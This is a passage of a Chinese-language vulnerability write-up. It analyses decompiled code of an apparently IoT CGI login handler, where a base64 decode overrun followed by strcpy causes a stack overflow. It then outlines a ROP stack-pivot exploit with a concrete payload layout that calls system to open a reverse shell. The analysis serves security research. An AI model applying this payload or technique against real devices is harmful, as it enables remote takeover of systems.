      _BOOL4 v34; // [rsp+8h] [rbp-1200h]
      __int64 v35; // [rsp+10h] [rbp-11F8h]
      _BOOL4 v36; // [rsp+10h] [rbp-11F8h]
      __int64 v37; // [rsp+18h] [rbp-11F0h]
      __int64 v38; // [rsp+20h] [rbp-11E8h]
      __int64 v39; // [rsp+28h] [rbp-11E0h]
      char src[8]; // [rsp+30h] [rbp-11D8h]
      char dest[8]; // [rsp+40h] [rbp-11C8h]
      char username[8]; // [rsp+50h] [rbp-11B8h]
      __int64 v43; // [rsp+58h] [rbp-11B0h]
      __int64 v44; // [rsp+60h] [rbp-11A8h]
      __int64 v45; // [rsp+68h] [rbp-11A0h]
      __int64 v46; // [rsp+70h] [rbp-1198h]
      __int64 v47; // [rsp+78h] [rbp-1190h]
      __int64 v48; // [rsp+80h] [rbp-1188h]
      __int64 v49; // [rsp+88h] [rbp-1180h]
      char pwd_decoded[64]; // [rsp+90h] [rbp-1178h]
      char pwd_b64[256]; // [rsp+D0h] [rbp-1138h]
      char v52; // [rsp+1D0h] [rbp-1038h]
      int v53; // [rsp+260h] [rbp-FA8h]
      char v54; // [rsp+264h] [rbp-FA4h]
      char v55; // [rsp+3CFh] [rbp-E39h]
      char v56; // [rsp+3D0h] [rbp-E38h]
      char v57; // [rsp+5CFh] [rbp-C39h]
      char v58; // [rsp+5D0h] [rbp-C38h]
      char v59; // [rsp+7CFh] [rbp-A39h]
      char v60; // [rsp+7D0h] [rbp-A38h]
      char v61; // [rsp+9D0h] [rbp-838h]
      char v62; // [rsp+BD0h] [rbp-638h]
      char v63; // [rsp+DCFh] [rbp-439h]
      char s; // [rsp+DD0h] [rbp-438h]
      char v65; // [rsp+FCFh] [rbp-239h]
      char v66; // [rsp+FD0h] [rbp-238h]
      memset(pwd_b64, 0, sizeof(pwd_b64));
      memset(pwd_decoded, 0, sizeof(pwd_decoded));
      memset(&v52, 0, 0x200uLL);
      memset(&v56, 0, 0x200uLL);
      memset(&v58, 0, 0x200uLL);
      *(_QWORD *)username = 0LL;
      memset(&v60, 0, 0x200uLL);
      memset(&v61, 0, 0x200uLL);
      memset(&v62, 0, 0x200uLL);
      memset(&s, 0, 0x200uLL);
      memset(&v66, 0, 0x200uLL);
      v43 = 0LL;
      v44 = 0LL;
      v45 = 0LL;
      *(_QWORD *)src = 0LL;
      *(_QWORD *)dest = 0LL;
      v46 = 0LL;
      v47 = 0LL;
      v48 = 0LL;
      v49 = 0LL;
      v33 = time(0LL);
      cgiFormString("username", username, 32LL);
      cgiFormString("pwd", pwd_b64, 256LL);
      base64decode((u_char *)pwd_decoded, pwd_b64, 256);
      pos_dbl_slash = index(username, '\\');
      if ( !pos_dbl_slash )
      {
        if ( (unsigned int)is_username_allowed(username) )
        {
          login_successful = check_login(username, pwd_decoded);
          v15 = 0;
          v16 = 0;
        }
  * 首先读取用户输入的username到username数组里，最大读取32个字节，读取pwd到pwd_b64数组里，最大读取256个字节
  * base64decode解密pwd_b64，将结果保存在pwd_decoded数组里，最大写入256个字节，但问题是pwd_decoded数组的size是64字节，所以会越界写入到pwd_b64数组里，但在这里不会影响程序的逻辑，因为pwd_b64在解密后就不会被用到。
  * `is_username_allowed`校验输入的用户名是否合法，该函数先将用户名里的大写字母转成小写，然后和一个全局字符串数组里的每个字符串比较，如果有任何一个匹配就返回0，代表非法，否则返回1，代表合法。
    * 之所以这样比较是因为它将所有注册的用户的账号密码都写入到了`/etc/shadow`文件里，而这个文件里的`root, anonymous...`等用户是linux系统使用的，而不是给注册用户使用的。
  * 然后将被溢出的数组pwd_decoded传给check_login函数。
### check_login
    __int64 __fastcall check_login(const char *username, const char *pwd_decoded)
    {
      FILE *v2; // rbp
      struct passwd *v3; // rax
      struct passwd *v4; // rbx
      const char *v6; // rax
      char password_copy_shadow[80]; // [rsp+0h] [rbp-C8h]
      char password_copy_input[88]; // [rsp+50h] [rbp-78h]
      v2 = fopen64("/etc/shadow", "r");
      while ( 1 )
      {
        v3 = fgetpwent(v2);
        v4 = v3;
        if ( !v3 )
          break;
        if ( !strcmp(v3->pw_name, username) )
        {
          strcpy(password_copy_shadow, v4->pw_passwd);
          fclose(v2);
          strcpy(password_copy_input, pwd_decoded);
  * 按行读取`/etc/shadow`里的数据，并解析成passwd结构体。
  * 拷贝pw_passwd字段到栈上变量password_copy_shadow数组里
  * 拷贝pwd_decoded到栈上变量password_copy_input数组里，因为pwd_decoded是一个写入溢出的字符串，其长度最大是192字节(base64算法，最大解密出来就是输入字符串的3/4长度)，而password_copy_input数组的size是88，所以在这个栈布局里就可以溢出到返回地址了。
如下是ida的stack
layout视图，r代表返回地址，如图可以看到从password_copy_input数组到返回地址，一共是120个字节，而我们可以写入192个字节，所以可以劫持返回地址。
    -00000000000000C8 ; D/A/*   : change type (data/ascii/array)
    -00000000000000C8 ; N       : rename
    -00000000000000C8 ; U       : undefine
    -00000000000000C8 ; Use data definition commands to create local variables and function arguments.
    -00000000000000C8 ; Two special fields " r" and " s" represent return address and saved registers.
    -00000000000000C8 ; Frame size: C8; Saved regs: 0; Purge: 0
    -00000000000000C8 ;
    -00000000000000C8
    -00000000000000C8 password_copy_shadow db 80 dup(?)
    -0000000000000078 password_copy_input db 120 dup(?)
    +0000000000000000  r              db 8 dup(?)
    +0000000000000008
    +0000000000000008 ; end of stack variables
## 漏洞模式
这个漏洞的模式就是写入的数据超出了数组本身的大小导致的写入越界，但实际造成栈溢出的地方是在更后面的strcpy的地方，相对来说其实比较隐蔽，strcpy这个函数会从源地址向目的地址拷贝数据，一直到遇到`\0`停止。
正常来说在往字符数组写入一个字符串的时候，都会把最后一个字节设置`\0`，但因为写入的越界，导致`\0`出现在了数组越界后的位置。
最终导致前面base64decode函数造成的写入越界向后传播，最终在某次strcpy的时候造成了栈溢出。
## 漏洞利用
正常来说栈溢出的漏洞利用只需要rop构造gadaget即可，但是对于64位架构的栈溢出来说，因为程序的装载基地址是0x400000，所以不考虑return
to
libc等情况，直接在程序体内来找合适的gadaget地址的话，不可避免的在写入地址的时候会遇到`\x00`，比如`0000000000401D00`这个地址，它的高位都是0。
所以在strcpy的时候，遇到高位的`\x00`就会被截断，所以在溢出的时候，最多就只能覆盖到返回地址，写入一个想到劫持到的地址，不能向后继续写入了。
如图可以看出，尽管我们溢出`password_copy_input`由于截断只能写到返回地址那个位置，进行一次gadaget。  
但是我们可以寻找`lea rsp, [rsp+??] ; retn`这样的gadaget来抬升栈，通过stack
pivot来将rsp指到`wd_login`栈上的pwd_decoded字符串里，而这个字符串的值显然是我们可以任意控制，并且不受`\x00`截断影响，它是base64解出来的。
所以到这里我们就可以进行多次gadaget了。
即我们要让pwd_decoded字符串里的内容形如，即可
    AAAAA * ? + p64(gadaget_addr1) + 需要的pop的寄存器值 + p64(gadaget_addr2) + 需要的pop的寄存器值 + p64(gadaget_addr3)...
然后由于一般的cgi程序里其实都会调很多system函数，所以我们只要再通过多次gadaget传递我们需要的命令到调用system函数的地方，最终执行该代码就可以反弹shell了。
但这个cgi程序里有个非常有趣的地方，就是`00000000004039B7`这个地址，它既有栈抬升，又有call system。
所以我们需要的payload就是`A * 120 + p64(0x4039B7) + system_cmd_str`即可。
解释一下，在溢出覆盖返回地址后，会跳到`00000000004039B7`去call一次无效的system命令，然后`lea rsp,
[rsp+108h]`栈抬升，此时rsp指向我们在pwd_decoded里的`p64(0x4039B7) + system_cmd_str`字符串。
然后再retn，弹出p64返回地址，再次跳回到`00000000004039B7`执行，此时rsp指向的就是要执行的反弹shell字符串，并传给rdi，作为system的参数执行，此时就成功的反弹shell了。
    .text:00000000004039B7                 lea     rdi, [rsp]
    .text:00000000004039BB                 call    _system
    .text:00000000004039C0                 xor     eax, eax
    .text:00000000004039C2                 lea     rsp, [rsp+108h]
    .text:00000000004039CA                 retn
具体的调试就留给读者权做练习了。
总结一下，iot的栈溢出，找gadaget的要点就是
  * 栈抬升
    * `lea rsp, [rsp+?]`
  * 找system，传参劫持过去。
## 参考链接
  * 